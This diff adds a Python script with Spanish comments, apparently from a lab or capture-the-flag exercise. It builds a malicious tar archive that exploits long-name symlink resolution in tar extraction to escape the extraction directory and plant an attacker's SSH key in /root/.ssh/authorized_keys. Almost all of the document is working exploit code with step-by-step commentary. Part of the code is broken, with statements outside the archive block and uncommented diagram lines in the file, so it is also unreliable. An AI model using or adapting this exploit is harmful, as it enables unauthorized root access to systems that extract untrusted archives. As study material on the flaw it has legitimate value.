@@ -1,0 +1,125 @@
+# script.py
+import tarfile
+import os
+import io
+import sys
+
+pubkey = b"ssh-ed25519 AAAAC3 <SNIP> 1/Lte+vRLNjQ fury@kali\n" #Aquí escribimos la nuestra llave pública usuario@máquina al final
+
+#La longitud de esta cadena depende del OS, si es mac = 55, de otra forma 247, esto para evadir límites de longitud, como se indica en el PoC
+
+comp = 'd' * (55 if sys.platform == 'darwin' else 247)
+
+steps = "abcdefghijklmnop" #16 iteraciones para el bucle for
+
+path = "" #Cadena vacía que se usa para definir el path
+
+#Abre como tar un archivo llamado backup_2.tar, cumple con el requisito impuesto por el código de automatización
+
+with tarfile.open("backup_2.tar", "x") as tar:
+
+#Para cada letra dentro de steps
+
+	for i in steps:
+
+#Almacena los metadatos de path+comp como tar (Ejemplo: "" + ddddd… = /ddddddddd…)
+
+		a = tarfile.TarInfo(os.path.join(path, comp)) 
+
+		a.type = tarfile.DIRTYPE #Tipo directorio
+
+		tar.addfile(a) # Añade a al archivo tar (backup_2.tar)
+
+#Almacena los metadatos de path + i como tar (Ejemplo: "" + a = /a) 
+
+		b = tarfile.TarInfo(os.path.join(path, i)) 
+
+		b.type = tarfile.SYMTYPE #Tipo symlink
+
+		b.linkname = comp #Apunta a comp, es decir a /dddddd…
+
+		tar.addfile(b) #Añade al archivo tar (backup_2.tar)
+
+#Se redefine path de tal forma que al inicio (a=tarfile.Tarinfo...) se suma /ddddd… + /ddddd y el siymlink ahora es b apuntando a /ddd…, y así sucesivamente
+
+		path = os.path.join(path, comp) 
+
+#El bucle construye una cadena de directorios anidados de 16 niveles en donde a, b, c, d... apuntan cada una a un nivel de la jerarquía de directorios cada vez más profunda
+
+linkpath = os.path.join("/".join(steps), "l" * 254) #Resultado = "/a/b/c/d/e…/1111...
+
+#Almacena los metadatos
+l = tarfile.TarInfo(linkpath)
+
+#Tipo symlink
+l.type = tarfile.SYMTYPE
+
+# Apunta a ../../../../../../ con la longitud de steps, es decir 16 
+l.linkname = "../" * len(steps)
+ 
+#Añade al archivo tar
+tar.addfile(l)
+
+#Este será el método para escapar del directorio
+e = tarfile.TarInfo("escape")
+
+e.type = tarfile.SYMTYPE #Tipo symlink
+
+#Apunta a /root/.ssh/authorized_keys
+e.linkname = linkpath + "/../../../../root/.ssh/authorized_keys"
+
+#Añade al archivo tar
+tar.addfile(e)
+
+#Para inyectar
+f = tarfile.TarInfo("inject")
+
+#Tipo hardlink
+f.type = tarfile.LNKTYPE
+
+#Apunta al mismo lugar que escape, es decir /root/.ssh...
+f.linkname = "escape"
+
+#Añade a tar
+tar.addfile(f)
+
+c = tarfile.TarInfo("inject")
+c.type = tarfile.REGTYPE #Tipo de archivo regular 
+
+c.size = len(pubkey) #Del tamaño de la llave pública
+
+tar.addfile(c, fileobj=io.BytesIO(pubkey)) #Escibe la llave pública mediante un stream de bytes
+
+#Primero se crea la estructura jerárquica de directorios, el siguiente archivo presente es /a/b/c/d/e.../111...
+
+#Se comienza a tratar así
+
+a/b/c/d/e/f.../1111... -> ../../../../../…
+
+A -> /d 
+/d/B->/d 
+/d/d/C->/d
+/d/d/d/D->/d
+/d/d/d/d/E->/d
+/d/d/d/d/d/F->/d 
+/d/d/d/d/d/d/G->/d
+/d/d/d/d/d/d/d/H->/d
+/d/d/d/d/d/d/d/d/I->/d
+/d/d/d/d/d/d/d/d/d/J->/d
+/d/d/d/d/d/d/d/d/d/d/K->/d/
+/d/d/d/d/d/d/d/d/d/d/d/L->/d
+/d/d/d/d/d/d/d/d/d/d/d/d/M->/d
+/d/d/d/d/d/d/d/d/d/d/d/d/d/N->/d
+/d/d/d/d/d/d/d/d/d/d/d/d/d/d/O->/d
+/d/d/d/d/d/d/d/d/d/d/d/d/d/d/d/P->/d
+
+#Se ponen 16 para que el código pueda escapar en teoría de "Cualquier sistema". Sin embargo solo se necesitan 5 (/opt/backup_clients/restored_backups/evil_path/escape)
+
+#En teoría se pueden poner la cantidad de ../ que se necesiten en e.linkname pues no hay efecto cuando se llega a root "/" y se sigue haciendo ../
+
+#El siguiente es /a/b/c/d.../1111.. -> ../../../../
+#El siguiente es escape -> /a/b/c/d/e...111.../ + /../../../../../root/.ssh/authorized_keys
+#El siguiente es inject -> escape
+#El siguiente es inject -> ssh_key 
+
+#La vulnerabilidad se encuentra en la forma en la que se lidian con nombres largos. No se explica más, pero aparentemente este es el bug que termina resultando en que los symlinks se resuelven cuando se excede un límite de caracteres en el nombre. De tal forma que al final el aparente directorio correcto para que se escriba el archivo extraído (la llave pública ssh) es /root/.ssh/authorized_keys.
